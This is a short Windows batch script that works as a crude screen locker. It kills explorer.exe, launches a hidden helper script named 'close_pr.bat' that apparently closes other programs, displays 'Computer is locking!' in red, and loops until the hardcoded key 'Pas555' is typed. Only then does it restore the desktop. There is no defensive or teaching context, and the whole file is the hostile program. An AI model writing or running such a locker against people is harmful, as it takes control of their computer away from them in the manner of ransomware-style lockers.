@echo off
set password=Pas555
start "AutoCloser" /min "close_pr.bat"
taskkill /f /IM explorer.exe
title Locker Windows
color 04
:unlock
cls
echo Computer is locking!
echo.
set /p unlock=Plese write key to unlock: 
if %unlock% == %password% (
taskkill /fi "windowtitle eq AutoCloser - close_pr.bat" /f
start explorer.exe
pause
)else (
goto unlock )
